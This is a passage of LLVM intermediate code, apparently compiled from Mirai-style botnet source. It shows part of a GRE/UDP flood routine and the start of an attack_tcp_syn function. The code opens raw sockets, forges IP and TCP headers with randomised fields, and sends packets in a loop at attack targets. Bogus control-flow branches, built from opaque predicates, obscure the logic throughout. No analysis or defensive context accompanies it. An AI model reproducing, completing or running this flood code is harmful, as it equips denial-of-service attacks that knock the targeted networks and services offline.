  %613 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %614 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %613, i32 0, i32 9
  %615 = load i32, i32* %614, align 4
  %616 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %617 = load i32, i32* %9, align 4
  %618 = sext i32 %617 to i64
  %619 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %616, i64 %618
  %620 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %619, i32 0, i32 0
  %621 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %620, i32 0, i32 2
  %622 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %621, i32 0, i32 0
  store i32 %615, i32* %622, align 4
  %623 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %624 = load i32, i32* %9, align 4
  %625 = sext i32 %624 to i64
  %626 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %623, i64 %625
  %627 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %626, i32 0, i32 0
  %628 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %627, i32 0, i32 1
  store i16 0, i16* %628, align 2
  %629 = load i32, i32* %10, align 4
  %630 = load i8*, i8** %30, align 8
  %631 = load i32, i32* %18, align 4
  %632 = sext i32 %631 to i64
  %633 = add i64 66, %632
  %634 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %635 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %636 = load i32, i32* %9, align 4
  %637 = sext i32 %636 to i64
  %638 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %635, i64 %637
  %639 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %638, i32 0, i32 0
  %640 = bitcast %struct.sockaddr_in* %639 to %struct.sockaddr*
  store %struct.sockaddr* %640, %struct.sockaddr** %634, align 8
  %641 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %642 = load %struct.sockaddr*, %struct.sockaddr** %641, align 8
  %643 = call i64 @sendto(i32 %629, i8* %630, i64 %633, i32 16384, %struct.sockaddr* %642, i32 16)
  br label %644

; <label>:644:                                    ; preds = %577
  %645 = load i32, i32* %9, align 4
  %646 = add nsw i32 %645, 1
  store i32 %646, i32* %9, align 4
  br label %337

; <label>:647:                                    ; preds = %337
  br label %336

; <label>:648:                                    ; preds = %108, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %86
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %111
  store i32 0, i32* %9, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %186
  %649 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %650 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %651 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %650, i32 0, i32 4
  store i16 %649, i16* %651, align 2
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %270
  %652 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %653 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %652, i32 0, i32 9
  %654 = load i32, i32* %653, align 4
  %655 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %656 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %655, i32 0, i32 9
  store i32 %654, i32* %656, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %300
  %657 = load i16, i16* %16, align 2
  %658 = call zeroext i16 @htons(i16 zeroext %657) #7
  %659 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %660 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %659, i32 0, i32 0
  store i16 %658, i16* %660, align 2
  %661 = load i16, i16* %17, align 2
  %662 = call zeroext i16 @htons(i16 zeroext %661) #7
  %663 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %664 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %663, i32 0, i32 1
  store i16 %662, i16* %664, align 2
  %665 = load i32, i32* %18, align 4
  %666 = sext i32 %665 to i64
  %_ = sub i64 0, 8
  %gen = add i64 %_, %666
  %_15 = shl i64 8, %666
  %667 = add i64 8, %666
  %668 = trunc i64 %667 to i16
  %669 = call zeroext i16 @htons(i16 zeroext %668) #7
  %670 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %671 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %670, i32 0, i32 2
  store i16 %669, i16* %671, align 2
  br label %originalBB14

originalBB19alteredBB:                            ; preds = %originalBB19, %342
  %672 = load i8**, i8*** %11, align 8
  %673 = load i32, i32* %9, align 4
  %674 = sext i32 %673 to i64
  %675 = getelementptr inbounds i8*, i8** %672, i64 %674
  %676 = load i8*, i8** %675, align 8
  store i8* %676, i8** %30, align 8
  %677 = load i8*, i8** %30, align 8
  %678 = bitcast i8* %677 to %struct.iphdr*
  store %struct.iphdr* %678, %struct.iphdr** %31, align 8
  %679 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %680 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %679, i64 1
  %681 = bitcast %struct.iphdr* %680 to %struct.grehdr*
  store %struct.grehdr* %681, %struct.grehdr** %32, align 8
  %682 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %683 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %682, i64 1
  %684 = bitcast %struct.grehdr* %683 to %struct.ethhdr*
  store %struct.ethhdr* %684, %struct.ethhdr** %33, align 8
  %685 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %686 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %685, i64 1
  %687 = bitcast %struct.ethhdr* %686 to %struct.iphdr*
  store %struct.iphdr* %687, %struct.iphdr** %34, align 8
  %688 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %689 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %688, i64 1
  %690 = bitcast %struct.iphdr* %689 to %struct.udphdr*
  store %struct.udphdr* %690, %struct.udphdr** %35, align 8
  %691 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %692 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %691, i64 1
  %693 = bitcast %struct.udphdr* %692 to i8*
  store i8* %693, i8** %36, align 8
  %694 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %695 = load i32, i32* %9, align 4
  %696 = sext i32 %695 to i64
  %697 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %694, i64 %696
  %698 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %697, i32 0, i32 2
  %699 = load i8, i8* %698, align 4
  %700 = zext i8 %699 to i32
  %701 = icmp slt i32 %700, 32
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %389
  %702 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %703 = load i32, i32* %9, align 4
  %704 = sext i32 %703 to i64
  %705 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %702, i64 %704
  %706 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %705, i32 0, i32 1
  %707 = load i32, i32* %706, align 4
  %708 = call i32 @ntohl(i32 %707) #7
  %709 = call i32 @rand_next()
  %710 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %711 = load i32, i32* %9, align 4
  %712 = sext i32 %711 to i64
  %713 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %710, i64 %712
  %714 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %713, i32 0, i32 2
  %715 = load i8, i8* %714, align 4
  %716 = zext i8 %715 to i32
  %_24 = sub i32 %709, %716
  %gen25 = mul i32 %_24, %716
  %717 = lshr i32 %709, %716
  %_26 = sub i32 %708, %717
  %gen27 = mul i32 %_26, %717
  %_28 = sub i32 0, %708
  %gen29 = add i32 %_28, %717
  %_30 = sub i32 0, %708
  %gen31 = add i32 %_30, %717
  %718 = add i32 %708, %717
  %719 = call i32 @htonl(i32 %718) #7
  %720 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %721 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %720, i32 0, i32 9
  store i32 %719, i32* %721, align 4
  br label %originalBB23

originalBB35alteredBB:                            ; preds = %originalBB35, %437
  %722 = call i32 @rand_next()
  %_36 = shl i32 %722, 65535
  %723 = and i32 %722, 65535
  %724 = trunc i32 %723 to i16
  %725 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %726 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %725, i32 0, i32 3
  store i16 %724, i16* %726, align 4
  %727 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %728 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %727, i32 0, i32 3
  %729 = load i16, i16* %728, align 4
  %730 = zext i16 %729 to i32
  %_37 = sub i32 %730, 1000
  %gen38 = mul i32 %_37, 1000
  %731 = sub nsw i32 %730, 1000
  %_39 = sub i32 0, %731
  %gen40 = add i32 %_39, -1
  %_41 = sub i32 0, %731
  %gen42 = add i32 %_41, -1
  %_43 = sub i32 %731, -1
  %gen44 = mul i32 %_43, -1
  %732 = xor i32 %731, -1
  %733 = trunc i32 %732 to i16
  %734 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %735 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %734, i32 0, i32 3
  store i16 %733, i16* %735, align 4
  br label %originalBB35

originalBB48alteredBB:                            ; preds = %originalBB48, %468
  %736 = load i16, i16* %16, align 2
  %737 = zext i16 %736 to i32
  %738 = icmp eq i32 %737, 65535
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %488
  %739 = call i32 @rand_next()
  %_53 = sub i32 %739, 65535
  %gen54 = mul i32 %_53, 65535
  %_55 = sub i32 %739, 65535
  %gen56 = mul i32 %_55, 65535
  %_57 = sub i32 %739, 65535
  %gen58 = mul i32 %_57, 65535
  %_59 = shl i32 %739, 65535
  %740 = and i32 %739, 65535
  %741 = trunc i32 %740 to i16
  %742 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %743 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %742, i32 0, i32 0
  store i16 %741, i16* %743, align 2
  br label %originalBB52

originalBB63alteredBB:                            ; preds = %originalBB63, %558
  %744 = load i8*, i8** %36, align 8
  %745 = load i32, i32* %18, align 4
  call void @rand_str(i8* %744, i32 %745)
  br label %originalBB63
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.25
  %6 = load i32, i32* @y.26
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i8, align 1
  %21 = alloca i16, align 2
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i16, align 2
  %25 = alloca i16, align 2
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8, align 1
  %29 = alloca i8, align 1
  %30 = alloca i8, align 1
  %31 = alloca i8, align 1
  %32 = alloca i8, align 1
  %33 = alloca i8, align 1
  %34 = alloca i32, align 4
  %35 = alloca %struct.iphdr*, align 8
  %36 = alloca %struct.tcphdr*, align 8
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca %struct.iphdr*, align 8
  %40 = alloca %struct.tcphdr*, align 8
  %41 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %42 = load i8, i8* %13, align 1
  %43 = zext i8 %42 to i64
  %44 = call noalias i8* @calloc(i64 %43, i64 8) #6
  %45 = bitcast i8* %44 to i8**
  store i8** %45, i8*** %19, align 8
  %46 = load i8, i8* %15, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 2, i32 0)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %20, align 1
  %50 = load i8, i8* %15, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 3, i32 65535)
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %21, align 2
  %54 = load i8, i8* %15, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 4, i32 64)
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %22, align 1
  %58 = load i8, i8* %15, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 5, i32 1)
  %61 = trunc i32 %60 to i8
  store i8 %61, i8* %23, align 1
  %62 = load i8, i8* %15, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 6, i32 65535)
  %65 = trunc i32 %64 to i16
  store i16 %65, i16* %24, align 2
  %66 = load i8, i8* %15, align 1
  %67 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %68 = call i32 @attack_get_opt_int(i8 zeroext %66, %struct.attack_option* %67, i8 zeroext 7, i32 65535)
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %25, align 2
  %70 = load i8, i8* %15, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %72 = call i32 @attack_get_opt_int(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 17, i32 65535)
  store i32 %72, i32* %26, align 4
  %73 = load i8, i8* %15, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 18, i32 0)
  store i32 %75, i32* %27, align 4
  %76 = load i8, i8* %15, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 11, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %28, align 1
  %80 = load i8, i8* %15, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 12, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %29, align 1
  %84 = load i8, i8* %15, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 13, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %30, align 1
  %88 = load i8, i8* %15, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 14, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %31, align 1
  %92 = load i8, i8* %15, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 15, i32 1)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %32, align 1
  %96 = load i8, i8* %15, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 16, i32 0)
  %99 = trunc i32 %98 to i8
  store i8 %99, i8* %33, align 1
  %100 = load i8, i8* %15, align 1
  %101 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %102 = load i32, i32* @LOCAL_ADDR, align 4
  %103 = call i32 @attack_get_opt_ip(i8 zeroext %100, %struct.attack_option* %101, i8 zeroext 25, i32 %102)
  store i32 %103, i32* %34, align 4
  %104 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %104, i32* %18, align 4
  %105 = icmp eq i32 %104, -1
  %106 = load i32, i32* @x.25
  %107 = load i32, i32* @y.26
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %105, label %114, label %115

; <label>:114:                                    ; preds = %originalBBpart2
  br label %629

; <label>:115:                                    ; preds = %originalBBpart2
  store i32 1, i32* %17, align 4
  %116 = load i32, i32* %18, align 4
  %117 = bitcast i32* %17 to i8*
  %118 = call i32 @setsockopt(i32 %116, i32 0, i32 3, i8* %117, i32 4) #6
  %119 = icmp eq i32 %118, -1
  br i1 %119, label %120, label %123

; <label>:120:                                    ; preds = %115
  %121 = load i32, i32* %18, align 4
  %122 = call i32 @close(i32 %121)
  br label %629

; <label>:123:                                    ; preds = %115
  store i32 0, i32* %17, align 4
  br label %124

; <label>:124:                                    ; preds = %349, %123
  %125 = load i32, i32* @x.25
  %126 = load i32, i32* @y.26
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %124
  %133 = load i32, i32* %17, align 4
  %134 = load i8, i8* %13, align 1
  %135 = zext i8 %134 to i32
  %136 = icmp slt i32 %133, %135
  %137 = load i32, i32* @x.25
  %138 = load i32, i32* @y.26
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %136, label %145, label %352

; <label>:145:                                    ; preds = %originalBBpart24
  %146 = load i32, i32* @x.25
  %147 = load i32, i32* @y.26
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %145
  %154 = call noalias i8* @calloc(i64 128, i64 1) #6
  %155 = load i8**, i8*** %19, align 8
  %156 = load i32, i32* %17, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds i8*, i8** %155, i64 %157
  store i8* %154, i8** %158, align 8
  %159 = load i8**, i8*** %19, align 8
  %160 = load i32, i32* %17, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds i8*, i8** %159, i64 %161
  %163 = load i8*, i8** %162, align 8
  %164 = bitcast i8* %163 to %struct.iphdr*
  store %struct.iphdr* %164, %struct.iphdr** %35, align 8
  %165 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i64 1
  %167 = bitcast %struct.iphdr* %166 to %struct.tcphdr*
  store %struct.tcphdr* %167, %struct.tcphdr** %36, align 8
  %168 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %169 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %168, i64 1
  %170 = bitcast %struct.tcphdr* %169 to i8*
  store i8* %170, i8** %37, align 8
  %171 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %172 = bitcast %struct.iphdr* %171 to i8*
  %173 = load i8, i8* %172, align 4
  %174 = and i8 %173, 15
  %175 = or i8 %174, 64
  store i8 %175, i8* %172, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %177 = bitcast %struct.iphdr* %176 to i8*
  %178 = load i8, i8* %177, align 4
  %179 = and i8 %178, -16
  %180 = or i8 %179, 5
  store i8 %180, i8* %177, align 4
  %181 = load i8, i8* %20, align 1
  %182 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 1
  store i8 %181, i8* %183, align 1
  %184 = call zeroext i16 @htons(i16 zeroext 60) #7
  %185 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 2
  store i16 %184, i16* %186, align 2
  %187 = load i16, i16* %21, align 2
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 3
  store i16 %188, i16* %190, align 4
  %191 = load i8, i8* %22, align 1
  %192 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 5
  store i8 %191, i8* %193, align 4
  %194 = load i8, i8* %23, align 1
  %195 = icmp ne i8 %194, 0
  %196 = load i32, i32* @x.25
  %197 = load i32, i32* @y.26
  %198 = sub i32 %196, 1
  %199 = mul i32 %196, %198
  %200 = urem i32 %199, 2
  %201 = icmp eq i32 %200, 0
  %202 = icmp slt i32 %197, 10
  %203 = or i1 %201, %202
  br i1 %203, label %originalBBpart227, label %originalBB6alteredBB

originalBBpart227:                                ; preds = %originalBB6
  br i1 %195, label %204, label %224

; <label>:204:                                    ; preds = %originalBBpart227
  %205 = load i32, i32* @x.25
  %206 = load i32, i32* @y.26
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
  %212 = or i1 %210, %211
  br i1 %212, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %204
  %213 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %214 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 4
  store i16 %213, i16* %215, align 2
  %216 = load i32, i32* @x.25
  %217 = load i32, i32* @y.26
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %224

; <label>:224:                                    ; preds = %originalBBpart231, %originalBBpart227
  %225 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i32 0, i32 6
  store i8 6, i8* %226, align 1
  %227 = load i32, i32* %34, align 4
  %228 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %229 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %228, i32 0, i32 8
  store i32 %227, i32* %229, align 4
  %230 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %231 = load i32, i32* %17, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %230, i64 %232
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %233, i32 0, i32 1
  %235 = load i32, i32* %234, align 4
  %236 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %236, i32 0, i32 9
  store i32 %235, i32* %237, align 4
  %238 = load i16, i16* %24, align 2
  %239 = call zeroext i16 @htons(i16 zeroext %238) #7
  %240 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  store i16 %239, i16* %241, align 4
  %242 = load i16, i16* %25, align 2
  %243 = call zeroext i16 @htons(i16 zeroext %242) #7
  %244 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 1
  store i16 %243, i16* %245, align 2
  %246 = load i32, i32* %26, align 4
  %247 = trunc i32 %246 to i16
  %248 = call zeroext i16 @htons(i16 zeroext %247) #7
  %249 = zext i16 %248 to i32
  %250 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %251 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %250, i32 0, i32 2
  store i32 %249, i32* %251, align 4
  %252 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 4
  %254 = load i16, i16* %253, align 4
  %255 = and i16 %254, -241
  %256 = or i16 %255, 160
  store i16 %256, i16* %253, align 4
  %257 = load i8, i8* %28, align 1
  %258 = sext i8 %257 to i16
  %259 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 4
  %261 = load i16, i16* %260, align 4
  %262 = and i16 %258, 1
  %263 = shl i16 %262, 13
  %264 = and i16 %261, -8193
  %265 = or i16 %264, %263
  store i16 %265, i16* %260, align 4
  %266 = load i8, i8* %29, align 1
  %267 = sext i8 %266 to i16
  %268 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %269 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %268, i32 0, i32 4
  %270 = load i16, i16* %269, align 4
  %271 = and i16 %267, 1
  %272 = shl i16 %271, 12
  %273 = and i16 %270, -4097
  %274 = or i16 %273, %272
  store i16 %274, i16* %269, align 4
  %275 = load i8, i8* %30, align 1
  %276 = sext i8 %275 to i16
  %277 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %278 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %277, i32 0, i32 4
  %279 = load i16, i16* %278, align 4
  %280 = and i16 %276, 1
  %281 = shl i16 %280, 11
  %282 = and i16 %279, -2049
  %283 = or i16 %282, %281
  store i16 %283, i16* %278, align 4
  %284 = load i8, i8* %31, align 1
  %285 = sext i8 %284 to i16
  %286 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %287 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %286, i32 0, i32 4
  %288 = load i16, i16* %287, align 4
  %289 = and i16 %285, 1
  %290 = shl i16 %289, 10
  %291 = and i16 %288, -1025
  %292 = or i16 %291, %290
  store i16 %292, i16* %287, align 4
  %293 = load i8, i8* %32, align 1
  %294 = sext i8 %293 to i16
  %295 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %296 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %295, i32 0, i32 4
  %297 = load i16, i16* %296, align 4
  %298 = and i16 %294, 1
  %299 = shl i16 %298, 9
  %300 = and i16 %297, -513
  %301 = or i16 %300, %299
  store i16 %301, i16* %296, align 4
  %302 = load i8, i8* %33, align 1
  %303 = sext i8 %302 to i16
  %304 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %305 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %304, i32 0, i32 4
  %306 = load i16, i16* %305, align 4
  %307 = and i16 %303, 1
  %308 = shl i16 %307, 8
  %309 = and i16 %306, -257
  %310 = or i16 %309, %308
  store i16 %310, i16* %305, align 4
  %311 = load i8*, i8** %37, align 8
  %312 = getelementptr inbounds i8, i8* %311, i32 1
  store i8* %312, i8** %37, align 8
  store i8 2, i8* %311, align 1
  %313 = load i8*, i8** %37, align 8
  %314 = getelementptr inbounds i8, i8* %313, i32 1
  store i8* %314, i8** %37, align 8
  store i8 4, i8* %313, align 1
  %315 = call i32 @rand_next()
  %316 = and i32 %315, 15
  %317 = add i32 1400, %316
  %318 = trunc i32 %317 to i16
  %319 = call zeroext i16 @htons(i16 zeroext %318) #7
  %320 = load i8*, i8** %37, align 8
  %321 = bitcast i8* %320 to i16*
  store i16 %319, i16* %321, align 2
  %322 = load i8*, i8** %37, align 8
  %323 = getelementptr inbounds i8, i8* %322, i64 2
  store i8* %323, i8** %37, align 8
  %324 = load i8*, i8** %37, align 8
  %325 = getelementptr inbounds i8, i8* %324, i32 1
  store i8* %325, i8** %37, align 8
  store i8 4, i8* %324, align 1
  %326 = load i8*, i8** %37, align 8
  %327 = getelementptr inbounds i8, i8* %326, i32 1
  store i8* %327, i8** %37, align 8
  store i8 2, i8* %326, align 1
  %328 = load i8*, i8** %37, align 8
  %329 = getelementptr inbounds i8, i8* %328, i32 1
  store i8* %329, i8** %37, align 8
  store i8 8, i8* %328, align 1
  %330 = load i8*, i8** %37, align 8
  %331 = getelementptr inbounds i8, i8* %330, i32 1
  store i8* %331, i8** %37, align 8
  store i8 10, i8* %330, align 1
  %332 = call i32 @rand_next()
  %333 = load i8*, i8** %37, align 8
  %334 = bitcast i8* %333 to i32*
  store i32 %332, i32* %334, align 4
  %335 = load i8*, i8** %37, align 8
  %336 = getelementptr inbounds i8, i8* %335, i64 4
